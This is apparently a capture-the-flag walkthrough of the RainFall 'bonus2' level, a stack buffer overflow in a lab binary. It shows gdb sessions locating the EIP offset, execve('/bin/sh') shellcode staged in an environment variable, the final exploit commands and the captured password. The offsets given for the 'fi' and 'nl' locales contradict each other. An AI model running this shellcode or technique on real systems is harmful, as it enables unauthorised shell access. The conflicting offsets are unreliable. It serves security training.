First we want to know how the buffer is write in this program with the default LANG:

bonus2@RainFall:~$ export LANG="en"
bonus2@RainFall:~$ gdb ./bonus2 
(gdb) run $(python -c 'print "A" * 60') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 60') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? ()
(gdb) i r
eax            0x4f	79
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xbffff580	-1073744512
esp            0xbffff530	0xbffff530
ebp            0x39614138	0x39614138
esi            0xbffff5cc	-1073744436
edi            0xbffff57c	-1073744516
eip            0x8006241	0x8006241			--> We look at the eip, we don t see any pattern... 
eflags         0x210286	[ PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

We tryed to put 0x08006241 in the https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
But nothing...

bonus2@RainFall:~$ export LANG="fi"
bonus2@RainFall:~$ gdb ./bonus2 
(gdb) run $(python -c 'print "A" * 60') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 60') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
																	   ----
																	our pattern	

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
(gdb) i r
eax            0x5b	91
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xbffff580	-1073744512
esp            0xbffff530	0xbffff530
ebp            0x35614134	0x35614134
esi            0xbffff5cc	-1073744436
edi            0xbffff57c	-1073744516
eip            0x41366141	0x41366141		--> 41 = A, 36 = 6, 61 = a, 41 = A (A6aA   --> reverse this = Aa6A) : We have a pattern
eflags         0x210286	[ PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

We have a padding of 18 for LANG="fi" (Calculated with https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator).
But you can calcute by hand :
a0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
<--------------->|
	17 bytes	 18eme byte



OK find the same this for the other : LANG="nl" 

bonus2@RainFall:~$ gdb ./bonus2 
(gdb) run $(python -c 'print "A" * 60') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A" * 60') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
																	        ----
																			our pattern
Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()
(gdb) i r
eax            0x56	86
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xbffff580	-1073744512
esp            0xbffff530	0xbffff530
ebp            0x61413661	0x61413661
esi            0xbffff5cc	-1073744436
edi            0xbffff57c	-1073744516
eip            0x38614137	0x38614137			--> 38 = 8 , 61 = a, 41 = A, 37 = 7 (8aA7 --> in reverse = 7Aa8) : We have a pattern
eflags         0x210286	[ PF SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

We have a padding of 18 for LANG="nl" (Calculated with https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator).

Now like in the bonus0, we are going to put our shellcode in the environnement variable SHELLCODEINJECTION.
We need to find where this environnement variable is in the stack :

export SHELLCODEINJECTION=$(python -c 'print "\x90"*128 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

(gdb) b main
Breakpoint 1 at 0x804852f
(gdb) 
(gdb) run
Starting program: /home/user/bonus2/bonus2 
Breakpoint 1, 0x0804852f in main ()
(gdb) (gdb) x/s *((char **)environ+1)
Undefined command: "".  Try "help".
(gdb) x/s *((char **)environ+1)
0xbffff877:	 "TERM=xterm-256color"
(gdb) x/s *((char **)environ)
0xbffff867:	 "SHELL=/bin/bash"
(gdb) x/30s *((char **)environ)
0xbffff867:	 "SHELL=/bin/bash"
0xbffff877:	 "TERM=xterm-256color"
0xbffff88b:	 "SSH_CLIENT=192.168.56.1 50140 4242"
0xbffff8ae:	 "SSH_TTY=/dev/pts/0"
0xbffff8c1:	 "USER=bonus2"
0xbffff8cd:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xbffff995:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
0xbffffa5d:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
0xbffffb25:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
0xbffffbed:	 "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
0xbffffcb5:	 ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
0xbffffd7d:	 ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
0xbffffdee:	 "COLUMNS=134"
0xbffffdfa:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xbffffe47:	 "MAIL=/var/mail/bonus2"
0xbffffe5d:	 "_=/usr/bin/gdb"
0xbffffe6c:	 "PWD=/home/user/bonus2"
0xbffffe82:	 "LANG=fi"
0xbffffe8a:	 "LINES=32"
0xbffffe93:	 										--> our shellcode address	"SHELLCODEINJECTION=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\231Ph//shh/bin\211\343PS\211\341\260\v\315\200"
0xbfffff3f:	 "HOME=/home/user/bonus2"
---Type <return> to continue, or q <return> to quit---
0xbfffff56:	 "SHLVL=1"
0xbfffff5e:	 "LOGNAME=bonus2"
0xbfffff6d:	 "SSH_CONNECTION=192.168.56.1 50140 192.168.56.3 4242"
0xbfffffa1:	 "LESSOPEN=| /usr/bin/lesspipe %s"
0xbfffffc1:	 "LESSCLOSE=/usr/bin/lesspipe %s %s"
0xbfffffe3:	 "/home/user/bonus2/bonus2"
0xbffffffc:	 ""
0xbffffffd:	 ""
0xbffffffe:	 ""


0xbffffe93 in little endian = \x93\xfe\xff\xbf

Now we have our two offset for nl (18) and fi (23)
So we can overflow the buffer in greetuser function with the address of the shellcode + 18 or 23.
We just have to put 40 bytes or more for the first argument, and adjust the second argument depending on the LANG variable.

Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab		(fi)
<-----------><--------------------------------------><------------------------------>
	13 bytes 				40 bytes						32 bytes

13 + 40 + 32 = 85 bytes --> We can write 85 bytes in the buffer.

Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab		(nl)
<-----------><--------------------------------------><------------------------------>
	13 bytes				40 bytes						32 bytes

So same thing for nl, we can write 85 bytes in the buffer.



We now that in the greetuser function the buffer is :
char var_4c[72]; ---> 0x080484a2 <+30>:	lea    -0x48(%ebp),%eax		--> -72 bytes
So we have 72 bytes, but we can write 85, so we can overwrite the buffer, and put our shellcode with no problem.
	
./bonus2 $(python -c 'print "A" * 60') $(python -c 'print "B" * 18 + "\x93\xfe\xff\xbf"')		--> fi
./bonus2 $(python -c 'print "A" * 60') $(python -c 'print "B" * 23 + "\x93\xfe\xff\xbf"')		--> nl

$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
